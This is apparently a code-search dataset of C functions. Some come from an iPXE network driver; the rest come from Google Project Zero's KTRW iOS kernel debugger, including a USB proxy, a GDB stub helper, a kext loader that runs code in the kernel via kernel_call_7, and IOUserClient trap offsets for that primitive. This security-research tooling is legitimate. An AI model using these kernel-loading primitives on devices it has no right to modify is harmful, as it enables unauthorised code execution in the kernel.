{"docstring": "/**\n * igb_configure_tx - Configure 8254x Transmit Unit after Reset\n * @adapter: board private structure\n *\n * Configure the Tx unit of the MAC after a reset.\n **/\n", "func_signal": "static void igb_configure_tx ( struct igb_adapter *adapter )", "code": "{\n\tstruct e1000_hw *hw = &adapter->hw;\n\tu32 tctl, txdctl;\n\n\tDBG ( \"igb_configure_tx\\n\" );\n\n\t/* disable transmits while setting up the descriptors */\n\ttctl = E1000_READ_REG ( hw, E1000_TCTL );\n\tE1000_WRITE_REG ( hw, E1000_TCTL, tctl & ~E1000_TCTL_EN );\n\tE1000_WRITE_FLUSH(hw);\n\tmdelay(10);\n\n\tE1000_WRITE_REG ( hw, E1000_TDBAH(0), 0 );\n\tE1000_WRITE_REG ( hw, E1000_TDBAL(0), virt_to_bus ( adapter->tx_base ) );\n\tE1000_WRITE_REG ( hw, E1000_TDLEN(0), adapter->tx_ring_size );\n\n\tDBG ( \"E1000_TDBAL(0): %#08x\\n\",  E1000_READ_REG ( hw, E1000_TDBAL(0) ) );\n\tDBG ( \"E1000_TDLEN(0): %d\\n\",\t  E1000_READ_REG ( hw, E1000_TDLEN(0) ) );\n\n\t/* Setup the HW Tx Head and Tail descriptor pointers */\n\tE1000_WRITE_REG ( hw, E1000_TDH(0), 0 );\n\tE1000_WRITE_REG ( hw, E1000_TDT(0), 0 );\n\n\tadapter->tx_head = 0;\n\tadapter->tx_tail = 0;\n\tadapter->tx_fill_ctr = 0;\n\n\ttxdctl = E1000_READ_REG ( hw, E1000_TXDCTL(0) );\n\ttxdctl |= E1000_TXDCTL_QUEUE_ENABLE;\n\tE1000_WRITE_REG ( hw, E1000_TXDCTL(0), txdctl );\n\n\t/* Setup Transmit Descriptor Settings for eop descriptor */\n\tadapter->txd_cmd = E1000_TXD_CMD_EOP | E1000_TXD_CMD_IFCS;\n\n\t/* enable Report Status bit */\n\tadapter->txd_cmd |= E1000_TXD_CMD_RS;\n\n\t/* Program the Transmit Control Register */\n\ttctl &= ~E1000_TCTL_CT;\n\ttctl |= E1000_TCTL_PSP | E1000_TCTL_RTLC |\n\t\t(E1000_COLLISION_THRESHOLD << E1000_CT_SHIFT);\n\n\tigb_config_collision_dist(hw);\n\n\t/* Enable transmits */\n\ttctl |= E1000_TCTL_EN;\n\tE1000_WRITE_REG(hw, E1000_TCTL, tctl);\n\tE1000_WRITE_FLUSH(hw);\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/**\n * igb_setup_tx_resources - allocate Tx resources (Descriptors)\n *\n * @v adapter\te1000 private structure\n *\n * @ret rc\t Returns 0 on success, negative on failure\n **/\n", "func_signal": "static int igb_setup_tx_resources ( struct igb_adapter *adapter )", "code": "{\n\tDBG ( \"igb_setup_tx_resources\\n\" );\n\n\t/* Allocate transmit descriptor ring memory.\n\t   It must not cross a 64K boundary because of hardware errata #23\n\t   so we use malloc_dma() requesting a 128 byte block that is\n\t   128 byte aligned. This should guarantee that the memory\n\t   allocated will not cross a 64K boundary, because 128 is an\n\t   even multiple of 65536 ( 65536 / 128 == 512 ), so all possible\n\t   allocations of 128 bytes on a 128 byte boundary will not\n\t   cross 64K bytes.\n\t */\n\n\tadapter->tx_base =\n\t\tmalloc_dma ( adapter->tx_ring_size, adapter->tx_ring_size );\n\n\tif ( ! adapter->tx_base ) {\n\t\treturn -ENOMEM;\n\t}\n\n\tmemset ( adapter->tx_base, 0, adapter->tx_ring_size );\n\n\tDBG ( \"adapter->tx_base = %#08lx\\n\", virt_to_bus ( adapter->tx_base ) );\n\n\treturn 0;\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/**\n * igb_irq_enable - Enable default interrupt generation settings\n * @adapter: board private structure\n **/\n", "func_signal": "static void igb_irq_enable(struct igb_adapter *adapter)", "code": "{\n\tstruct e1000_hw *hw = &adapter->hw;\n\n\tE1000_WRITE_REG(hw, E1000_IMS, IMS_ENABLE_MASK);\n\tE1000_WRITE_REG(hw, E1000_IAM, IMS_ENABLE_MASK);\n\tE1000_WRITE_FLUSH(hw);\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/**\n * igb_reset - put adapter in known initial state\n * @adapter: board private structure\n **/\n", "func_signal": "void igb_reset(struct igb_adapter *adapter)", "code": "{\n\tstruct e1000_hw *hw = &adapter->hw;\n\n\tstruct e1000_mac_info *mac = &hw->mac;\n\tstruct e1000_fc_info *fc = &hw->fc;\n\tu32 pba = 0;\n\tu16 hwm;\n\n\t/* Repartition Pba for greater than 9k mtu\n\t * To take effect CTRL.RST is required.\n\t */\n\tswitch (mac->type) {\n\tcase e1000_82576:\n\t\tpba = E1000_READ_REG(hw, E1000_RXPBS);\n\t\tpba &= E1000_RXPBS_SIZE_MASK_82576;\n\t\tbreak;\n\tcase e1000_82575:\n\tdefault:\n\t\tpba = E1000_PBA_34K;\n\t\tbreak;\n\t}\n\n\t/* flow control settings */\n\t/* The high water mark must be low enough to fit one full frame\n\t * (or the size used for early receive) above it in the Rx FIFO.\n\t * Set it to the lower of:\n\t * - 90% of the Rx FIFO size, or\n\t * - the full Rx FIFO size minus one full frame */\n#define min(a,b) (((a)<(b))?(a):(b))\n\thwm = min(((pba << 10) * 9 / 10),\n\t\t\t((pba << 10) - 2 * adapter->max_frame_size));\n\n\tif (mac->type < e1000_82576) {\n\t\tfc->high_water = hwm & 0xFFF8;\t/* 8-byte granularity */\n\t\tfc->low_water = fc->high_water - 8;\n\t} else {\n\t\tfc->high_water = hwm & 0xFFF0;\t/* 16-byte granularity */\n\t\tfc->low_water = fc->high_water - 16;\n\t}\n\tfc->pause_time = 0xFFFF;\n\tfc->send_xon = 1;\n\tfc->current_mode = fc->requested_mode;\n\n\t/* Allow time for pending master requests to run */\n\tigb_reset_hw(hw);\n\tE1000_WRITE_REG(hw, E1000_WUC, 0);\n\n\tif (igb_init_hw(hw)) {\n\t\tDBG (\"Hardware Error\\n\");\n        }\n\n\tigb_get_phy_info(hw);\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "/**\n * igb_refill_rx_ring - allocate Rx io_buffers\n *\n * @v adapter\te1000 private structure\n *\n * @ret rc\t Returns 0 on success, negative on failure\n **/\n", "func_signal": "static int igb_refill_rx_ring ( struct igb_adapter *adapter )", "code": "{\n\tint i, rx_curr;\n\tint rc = 0;\n\tstruct e1000_rx_desc *rx_curr_desc;\n\tstruct e1000_hw *hw = &adapter->hw;\n\tstruct io_buffer *iob;\n\n\tDBGP (\"igb_refill_rx_ring\\n\");\n\n\tfor ( i = 0; i < NUM_RX_DESC; i++ ) {\n\t\trx_curr = ( ( adapter->rx_curr + i ) % NUM_RX_DESC );\n\t\trx_curr_desc = adapter->rx_base + rx_curr;\n\n\t\tif ( rx_curr_desc->status & E1000_RXD_STAT_DD )\n\t\t\tcontinue;\n\n\t\tif ( adapter->rx_iobuf[rx_curr] != NULL )\n\t\t\tcontinue;\n\n\t\tDBG2 ( \"Refilling rx desc %d\\n\", rx_curr );\n\n\t\tiob = alloc_iob ( MAXIMUM_ETHERNET_VLAN_SIZE );\n\t\tadapter->rx_iobuf[rx_curr] = iob;\n\n\t\tif ( ! iob ) {\n\t\t\tDBG ( \"alloc_iob failed\\n\" );\n\t\t\trc = -ENOMEM;\n\t\t\tbreak;\n\t\t} else {\n\t\t\trx_curr_desc->buffer_addr = virt_to_bus ( iob->data );\n\n\t\t\tE1000_WRITE_REG ( hw, E1000_RDT(0), rx_curr );\n\t\t}\n\t}\n\treturn rc;\n}", "path": "DECAF/decaf/roms/ipxe/src/drivers/net/igb/igb_main.c", "commit_date": "2014-12-17 00:00:00", "repo_name": "decaf-project/DECAF", "stars": 765, "license": "gpl-3.0", "language": "c", "size": 78317}
{"docstring": "// Allocate a CFDictionary that will match the KTRW debugger's USB device descriptor.\n", "func_signal": "static CFDictionaryRef\ncreate_ktrw_iokit_usb_matching_dictionary()", "code": "{\n\tCFMutableDictionaryRef matchingDict = IOServiceMatching(kIOUSBDeviceClassName);\n\tint32_t appleVendorId = kAppleVendorID;\n\tCFNumberRef vendorId = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &appleVendorId);\n\tCFDictionarySetValue(matchingDict, CFSTR(kUSBVendorID), vendorId);\n\tCFRelease(vendorId);\n\tint32_t ktrwProductId = 0x1337;\n\tCFNumberRef productId = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &ktrwProductId);\n\tCFDictionarySetValue(matchingDict, CFSTR(kUSBProductID), productId);\n\tCFRelease(productId);\n\treturn matchingDict;\n}", "path": "ktrw/ktrw_usb_proxy/source/ktrw_usb_proxy.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "// Handle input on the socket synchronously. Socket input is forwarded directly over USB to KTRW.\n", "func_signal": "static void\nhandle_socket_input(struct ktrw_connection_state *state, intptr_t input_size)", "code": "{\n\tsize_t left = input_size;\n\twhile (left) {\n\t\t// Read the packet. We don't need the source address since we're assuming this all\n\t\t// takes place on localhost.\n\t\tchar buffer[0x1000];\n\t\tsize_t capacity = sizeof(buffer);\n\t\tif (capacity > left) {\n\t\t\tcapacity = left;\n\t\t}\n\t\tssize_t read_count = read(state->socket, buffer, capacity);\n\t\t// If we failed to read anything, stop processing.\n\t\tif (read_count <= 0) {\n\t\t\tbreak;\n\t\t}\n\t\t// Process the input data.\n\t\tlog_data(buffer, sizeof(buffer), read_count,\n\t\t\t\t(state->ktrw != KTRW_USB_NULL ? 2 : 3));\n\t\t// We've consumed read_count bytes.\n\t\tleft -= read_count;\n\t\t// Send the data to KTRW.\n\t\tif (state->ktrw != KTRW_USB_NULL) {\n\t\t\tssize_t sent = ktrw_usb_send(state->ktrw, buffer, read_count);\n\t\t\tif (sent < read_count) {\n\t\t\t\tprintf(\"Error: Could not send data to KTRW\\n\");\n\t\t\t}\n\t\t}\n\t}\n}", "path": "ktrw/ktrw_usb_proxy/source/ktrw_usb_proxy.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "// A KTRW device was added.\n", "func_signal": "static void\nktrw_device_added(void *refCon, io_iterator_t iterator)", "code": "{\n\tstruct ktrw_connection_state *state = refCon;\n\tfor (;;) {\n\t\tio_service_t service = IOIteratorNext(iterator);\n\t\tif (service == IO_OBJECT_NULL) {\n\t\t\tbreak;\n\t\t}\n\t\tif (state->ktrw != KTRW_USB_NULL) {\n\t\t\tprintf(\"Ignoring additional KTRW device\\n\");\n\t\t} else {\n\t\t\t// Open the KTRW device.\n\t\t\tprintf(\"Found KTRW device %x\\n\", service);\n\t\t\tstate->ktrw = ktrw_usb_open(service, state->port_set);\n\t\t\tif (state->ktrw != KTRW_USB_NULL) {\n\t\t\t\tprintf(\"Opened KTRW device\\n\");\n\t\t\t\t// Fire off the first read.\n\t\t\t\tktrw_usb_recv(state->ktrw, state->ktrw_read_buffer,\n\t\t\t\t\t\tsizeof(state->ktrw_read_buffer), handle_ktrw_input,\n\t\t\t\t\t\tstate);\n\t\t\t}\n\t\t}\n\t\tIOObjectRelease(service);\n\t}\n}", "path": "ktrw/ktrw_usb_proxy/source/ktrw_usb_proxy.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "// Print usage information.\n", "func_signal": "_Noreturn static void\nusage()", "code": "{\n\tprintf(\"%s <tcp-port>\\n\"\n\t\t\"\\n\"\n\t\t\"    <tcp-port>          39399\\n\"\n\t\t\"\\n\",\n\t\tgetprogname());\n\texit(1);\n}", "path": "ktrw/ktrw_usb_proxy/source/ktrw_usb_proxy.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "// Open the socket that listens for connections.\n", "func_signal": "static bool\nopen_server_socket(unsigned port, int *server_fd)", "code": "{\n\t// Create the socket.\n\tint fd = socket(AF_INET, SOCK_STREAM, 0);\n\tif (fd < 0) {\n\t\tprintf(\"Error: %s: %s\\n\", \"socket\", strerror(errno));\n\t\tgoto fail_0;\n\t}\n\t// Allow immediate reuse of the port.\n\tint optval = 1;\n\tsetsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));\n\t// Bind the socket to the port.\n\tstruct sockaddr_in sa = {};\n\tsa.sin_family      = AF_INET;\n\tsa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);\n\tsa.sin_port        = htons(port);\n\tint err = bind(fd, (struct sockaddr *)&sa, sizeof(sa));\n\tif (err != 0) {\n\t\tprintf(\"Error: %s: %s\\n\", \"bind\", strerror(errno));\n\t\tgoto fail_1;\n\t}\n\t// Don't store a listening backlog.\n\terr = listen(fd, 0);\n\tif (err != 0) {\n\t\tprintf(\"Error: %s: %s\\n\", \"listen\", strerror(errno));\n\t\tgoto fail_1;\n\t}\n\t// Success!\n\t*server_fd = fd;\n\treturn true;\nfail_1:\n\tclose(fd);\nfail_0:\n\treturn false;\n}", "path": "ktrw/ktrw_usb_proxy/source/ktrw_usb_proxy.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "// Handle input from KTRW and queue another request to receive input. This function is indirectly\n// called by handle_notification_message()/IODispatchCalloutFromMessage(), which processes the\n// completion notification for the read request.\n", "func_signal": "static void\nhandle_ktrw_input(void *context, ssize_t read_count)", "code": "{\n\tstruct ktrw_connection_state *state = context;\n\tif (state->ktrw == KTRW_USB_NULL) {\n\t\tprintf(\"Error: KTRW device disappeared\\n\");\n\t\treturn;\n\t}\n\t// Process the input data.\n\tif (read_count > 0) {\n\t\tlog_data(state->ktrw_read_buffer, sizeof(state->ktrw_read_buffer),\n\t\t\t\tread_count, (state->socket < 0 ? 0 : 1));\n\t\t// Send the data to the socket.\n\t\tif (state->socket >= 0) {\n\t\t\tssize_t written = write(state->socket,\n\t\t\t\t\tstate->ktrw_read_buffer, read_count);\n\t\t\tif (written != read_count) {\n\t\t\t\tprintf(\"Error: %s: %s\\n\", \"write\", strerror(errno));\n\t\t\t}\n\t\t}\n\t}\n\t// Fire off another read request.\n\tktrw_usb_recv(state->ktrw, state->ktrw_read_buffer, sizeof(state->ktrw_read_buffer),\n\t\t\thandle_ktrw_input, state);\n}", "path": "ktrw/ktrw_usb_proxy/source/ktrw_usb_proxy.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "/*\n * load_and_run_kext\n *\n * Description:\n * \tLoad the kernel extension into the kernel and run it with the specified argument.\n */\n", "func_signal": "static uint64_t\nload_and_run_kext(const char *path, void *data, size_t size, uint64_t argument)", "code": "{\n\tDEBUG_TRACE(1, \"Loading kext %s\", path);\n\tstruct mach_header_64 *mh = data;\n\t// Validate the Mach-O.\n\tstruct macho_info info;\n\tbool ok = validate_macho(path, mh, size, KEXT_START_SYMBOL, &info);\n\tif (!ok) {\n\t\treturn 0;\n\t}\n\t// Map the kext in userspace. This will need to be freed.\n\tvoid *userspace_mapping;\n\tok = map_macho(&info, &userspace_mapping);\n\tif (!ok) {\n\t\treturn 0;\n\t}\n\t// Link the kext.\n\tok = link_kext(userspace_mapping, &info);\n\tif (!ok) {\n\t\tfree(userspace_mapping);\n\t\treturn 0;\n\t}\n\t// Map the kext. This also performs internal relocations.\n\tuint64_t kext_address;\n\tok = map_kext(userspace_mapping, &info, &kext_address);\n\tfree(userspace_mapping);\n\tif (!ok) {\n\t\treturn 0;\n\t}\n\t// Start the kext.\n\tuint64_t kext_start = kext_address + info.entry;\n\tDEBUG_TRACE(1, \"Starting kext %s\", path);\n\tsleep(1);\n\t__unused uint32_t ret;\n\tret = kernel_call_7(kext_start, 1, argument);\n\tDEBUG_TRACE(1, \"_kext_start returned 0x%x\", ret);\n\treturn kext_address;\n}", "path": "ktrw/ktrw_kext_loader/kext_load/kext_load.c", "commit_date": "2019-11-20 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "/*\n * link_kext\n *\n * Description:\n * \tPerform in-memory linking of the mapped Mach-O.\n */\n", "func_signal": "static bool\nlink_kext(void *mapping, struct macho_info *info)", "code": "{\n\tconst struct mach_header_64 *mh = info->mh;\n\tconst struct symtab_command *symtab = info->symtab;\n\tconst struct dysymtab_command *dysymtab = info->dysymtab;\n\tconst struct nlist_64 *nlist = info->nlist;\n\tconst struct relocation_info *extrel = info->extrel;\n\t// Process the dysymtab's external relocations.\n\tfor (uint32_t extrel_idx = 0; extrel_idx < dysymtab->nextrel; extrel_idx++) {\n\t\tconst struct relocation_info *ri = &extrel[extrel_idx];\n\t\t// Skip non-extern or non-8-byte relocations.\n\t\tif (!ri->r_extern || ri->r_length != 3) {\n\t\t\tcontinue;\n\t\t}\n\t\t// Get the name of the symbol.\n\t\tconst struct nlist_64 *nl = &nlist[ri->r_symbolnum];\n\t\tuint32_t strx = nl->n_un.n_strx;\n\t\tconst char *name = (const char *)((uintptr_t)mh + symtab->stroff + strx);\n\t\t// Resolve the symbol to its runtime address.\n\t\tuint64_t symbol_value = resolve_symbol(name);\n\t\tif (symbol_value == 0) {\n\t\t\tWARNING(\"%s: Could not resolve symbol %s\", info->path, name);\n\t\t\tcontinue;\n\t\t}\n\t\tDEBUG_TRACE(1, \"Resolved %s = 0x%llx\", name, symbol_value + kernel_slide);\n\t\t// Find the offset of the relocation pointer in the virtually mapped Mach-O and\n\t\t// replace it with the resolved address of the symbol. r_address is the offset from\n\t\t// the first segment's vmaddr to the vmaddr of the pointer. Since we've put the\n\t\t// first segment's vmaddr at offset 0 in the mapping, this means that r_address is\n\t\t// exactly the offset into the mapping of the pointer we want to change.\n\t\tuint64_t vmoff = ri->r_address;\n\t\t*(uint64_t *)((uintptr_t)mapping + vmoff) = symbol_value + kernel_slide;\n\t}\n\treturn true;\n}", "path": "ktrw/ktrw_kext_loader/kext_load/kext_load.c", "commit_date": "2019-11-20 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "// Asynchronously receive data from KTRW.\n", "func_signal": "static void\nktrw_usb_recv(ktrw_usb_device ktrw, void *data, size_t size,\n\t\tvoid (*callback)(void *context, ssize_t size), void *context)", "code": "{\n\tassert(size <= 0x1000);\n\tassert(ktrw->read_callback == NULL && ktrw->read_context == NULL);\n\tktrw->read_callback = callback;\n\tktrw->read_context  = context;\n\t(*ktrw->interface)->ReadPipeAsync(ktrw->interface, 1, data, size,\n\t\t\tktrw_usb_recv_done, ktrw);\n}", "path": "ktrw/ktrw_usb_proxy/source/ktrw_usb_proxy.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "/*\n * map_macho\n *\n * Description:\n * \tMap the Mach-O file into memory.\n */\n", "func_signal": "static bool\nmap_macho(struct macho_info *info, void **mapped)", "code": "{\n\tconst struct mach_header_64 *mh = info->mh;\n\t// Allocate space for the virtually mapped file.\n\tvoid *mapping = malloc(info->vmsize);\n\tassert(mapping != NULL);\n\t*mapped = mapping;\n\t// Start copying in the segments.\n\tconst struct load_command *lc = (struct load_command *)(mh + 1);\n\tfor (uint32_t cmd_idx = 0; cmd_idx < mh->ncmds; cmd_idx++) {\n\t\tif (lc->cmd == LC_SEGMENT_64) {\n\t\t\tconst struct segment_command_64 *sc = (struct segment_command_64 *)lc;\n\t\t\tuint64_t vmoff = sc->vmaddr - info->base_vmaddr;\n\t\t\tvoid *vmseg = (uint8_t *)mapping + vmoff;\n\t\t\tvoid *fileseg = (uint8_t *)mh + sc->fileoff;\n\t\t\tmemcpy(vmseg, fileseg, sc->filesize);\n\t\t}\n\t\tlc = (struct load_command *)((uintptr_t)lc + lc->cmdsize);\n\t}\n\treturn true;\n}", "path": "ktrw/ktrw_kext_loader/kext_load/kext_load.c", "commit_date": "2019-11-20 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "/*\n * relocate_macho\n *\n * Description:\n * \tApply local relocations to base the kext at its new load address.\n */\n", "func_signal": "static void\nrelocate_macho(struct macho_info *info, void *mapping, uint64_t new_base_vmaddr)", "code": "{\n\tuint64_t base_vmaddr = info->base_vmaddr;\n\tconst struct dysymtab_command *dysymtab = info->dysymtab;\n\tconst struct relocation_info *locrel = info->locrel;\n\t// Process the dysymtab's local relocations.\n\tfor (uint32_t locrel_idx = 0; locrel_idx < dysymtab->nlocrel; locrel_idx++) {\n\t\tconst struct relocation_info *ri = &locrel[locrel_idx];\n\t\t// Skip extern or non-8-byte relocations.\n\t\tif (ri->r_extern || ri->r_length != 3) {\n\t\t\tcontinue;\n\t\t}\n\t\t// Find the offset of the relocation pointer in the virtually mapped Mach-O and\n\t\t// slide it to the new base address.\n\t\tuint64_t vmoff = ri->r_address;\n\t\tuint64_t *reloc_ptr = (uint64_t *)((uintptr_t)mapping + vmoff);\n\t\t*reloc_ptr = *reloc_ptr - base_vmaddr + new_base_vmaddr;\n\t}\n}", "path": "ktrw/ktrw_kext_loader/kext_load/kext_load.c", "commit_date": "2019-11-20 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "// Dispatch notification callbacks received on the port set.\n", "func_signal": "static void\nhandle_notification_message(struct ktrw_connection_state *state)", "code": "{\n\tfor (;;) {\n\t\tstruct {\n\t\t\tmach_msg_header_t hdr;\n\t\t\tuint8_t data[0x300];\n\t\t} msg = {};\n\t\tkern_return_t kr = mach_msg(&msg.hdr,\n\t\t\t\tMACH_RCV_MSG | MACH_RCV_TIMEOUT,\n\t\t\t\t0,\n\t\t\t\tsizeof(msg),\n\t\t\t\tstate->port_set,\n\t\t\t\t0,\n\t\t\t\tMACH_PORT_NULL);\n\t\tif (kr != KERN_SUCCESS) {\n\t\t\tif (kr != MACH_RCV_TIMED_OUT) {\n\t\t\t\tprintf(\"Error: Could not receive Mach message\\n\");\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t\tIODispatchCalloutFromMessage(NULL, &msg.hdr, NULL);\n\t}\n}", "path": "ktrw/ktrw_usb_proxy/source/ktrw_usb_proxy.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "// Record that a halt has taken place.\n", "func_signal": "static void\ngdb_stub_record_halt(int cpu_id)", "code": "{\n\tgdb.halted         |= (1 << cpu_id);\n\tgdb.process_halted |= (1 << cpu_id);\n\t// If we are in all-stop mode, and we have a deferred stop reply, and this is the first\n\t// stop we've observed, record it and switch to this CPU.\n\tif (!gdb.non_stop.enabled\n\t\t\t&& gdb.all_stop.stop_reply_deferred\n\t\t\t&& gdb.all_stop.first_stop == INVALID_CPU) {\n\t\tgdb.all_stop.first_stop = cpu_id;\n\t\tgdb.current_cpu = cpu_id;\n\t}\n}", "path": "ktrw/ktrw_gdb_stub/source/gdb_stub/gdb_stub.c", "commit_date": "2019-10-14 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "// ---- Offset initialization ---------------------------------------------------------------------\n", "func_signal": "static void\noffsets__iphone10_1__16C101()", "code": "{\n\tOFFSET(ipc_port, ip_kobject)                             = 104;\n\tOFFSET(proc, p_ucred)                                    = 0xf8;\n\tOFFSET(task, bsd_info)                                   = 0x358;\n\tSIZE(IOExternalTrap)                                     = 24;\n\tOFFSET(IOExternalTrap, object)                           = 0;\n\tOFFSET(IOExternalTrap, function)                         = 8;\n\tOFFSET(IOExternalTrap, offset)                           = 16;\n\tOFFSET(IORegistryEntry, reserved)                        = 16;\n\tOFFSET(IORegistryEntry__ExpansionData, fRegistryEntryID) = 8;\n\tVTABLE_INDEX(IOUserClient, getExternalTrapForIndex)      = 0x5b8 / 8;\n\tVTABLE_INDEX(IOUserClient, getTargetAndTrapForIndex)     = 0x5c0 / 8;\n}", "path": "ktrw/ktrw_kext_loader/kernel_call/kernel_call_parameters.c", "commit_date": "2020-01-22 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "// Handle a connection request on the server socket. Only one client is allowed at a time.\n", "func_signal": "static void\nhandle_server_connection(int server_fd, int kq, struct ktrw_connection_state *state)", "code": "{\n\t// Accept a connection on our server socket.\n\tstruct sockaddr_storage conn_addr;\n\tsocklen_t conn_addr_len = sizeof(conn_addr);\n\tint conn_fd = accept(server_fd, (struct sockaddr *) &conn_addr, &conn_addr_len);\n\tif (conn_fd < 0) {\n\t\tprintf(\"Error: %s: %s\\n\", \"accept\", strerror(errno));\n\t\tgoto fail_0;\n\t}\n\t// If we don't have a KTRW device or already have a connected client, reject.\n\tif (state->ktrw == KTRW_USB_NULL) {\n\t\tprintf(\"Closing connection: No KTRW USB devices available\\n\");\n\t\tgoto fail_1;\n\t}\n\tif (state->socket != -1) {\n\t\tprintf(\"Closing connection: Already have a connection\\n\");\n\t\tgoto fail_1;\n\t}\n\t// Mark the socket as non-blocking.\n\tint flags = fcntl(conn_fd, F_GETFL, 0);\n\tif (flags == -1) {\n\t\tprintf(\"Error: %s: %s\\n\", \"fcntl\", strerror(errno));\n\t\tgoto fail_1;\n\t}\n\tflags |= O_NONBLOCK;\n\tint err = fcntl(conn_fd, F_SETFL, flags);\n\tif (err != 0) {\n\t\tprintf(\"Error: %s: %s\\n\", \"fcntl\", strerror(errno));\n\t\tgoto fail_1;\n\t}\n\t// Monitor the socket file descriptor for the ability to read.\n\tstruct kevent kev;\n\tEV_SET(&kev, conn_fd, EVFILT_READ, EV_ADD, 0, 0, 0);\n\tint count = kevent(kq, &kev, 1, NULL, 0, NULL);\n\tif (count < 0) {\n\t\tprintf(\"Error: %s: %s\\n\", \"kevent\", strerror(errno));\n\t\tgoto fail_1;\n\t}\n\t// Success!\n\tstate->socket = conn_fd;\n\treturn;\nfail_1:\n\tclose(conn_fd);\nfail_0:\n\treturn;\n}", "path": "ktrw/ktrw_usb_proxy/source/ktrw_usb_proxy.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "// An internal function to invoke the callback supplied to ktrw_usb_recv().\n", "func_signal": "static void\nktrw_usb_recv_done(void *refCon, IOReturn result, void *arg0)", "code": "{\n\tktrw_usb_device ktrw = refCon;\n\tUInt32 read_size = (UInt32) (uintptr_t) arg0;\n\tvoid (*callback)(void *context, ssize_t read_count) = ktrw->read_callback;\n\tvoid *context = ktrw->read_context;\n\tktrw->read_callback = NULL;\n\tktrw->read_context = NULL;\n\tssize_t read_count = read_size;\n\tif (result != kIOReturnSuccess) {\n\t\tprintf(\"Error: Could not %s KTRW data: %x: %s\\n\", \"read\",\n\t\t\t\tresult, mach_error_string(result));\n\t\tread_count = -1;\n\t}\n\tcallback(context, read_count);\n}", "path": "ktrw/ktrw_usb_proxy/source/ktrw_usb_proxy.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
{"docstring": "// Log data passing from KTRW to GDB or GDB to KTRW. Pass a state of 0 for KTRW -> ???, 1 for KTRW\n// -> GDB, 2 for GDB -> KTRW, 3 for GDB -> ???.\n", "func_signal": "static void\nlog_data(const void *data, size_t size, size_t read, int state)", "code": "{\n\tconst char *char_data = data;\n\tchar buffer[size];\n\tfor (size_t i = 0; i < read; i++) {\n\t\tchar ch = char_data[i];\n\t\tif (!isprint(ch)) {\n\t\t\tch = '.';\n\t\t}\n\t\tbuffer[i] = ch;\n\t}\n\tconst char *marker = \"??\";\n\tconst char *sep = \"\";\n\tswitch (state) {\n\t\tcase 0: sep = \"  \"; marker = \"-|\"; break;\n\t\tcase 1: sep = \"  \"; marker = \"->\"; break;\n\t\tcase 2: sep = \"\";   marker = \"<-\"; break;\n\t\tcase 3: sep = \"\";   marker = \"|-\"; break;\n\t}\n\tprintf(\" %s%s %.*s\\n\", marker, sep, (int)read, buffer);\n}", "path": "ktrw/ktrw_usb_proxy/source/ktrw_usb_proxy.c", "commit_date": "2020-06-09 00:00:00", "repo_name": "googleprojectzero/ktrw", "stars": 632, "license": "apache-2.0", "language": "c", "size": 276}
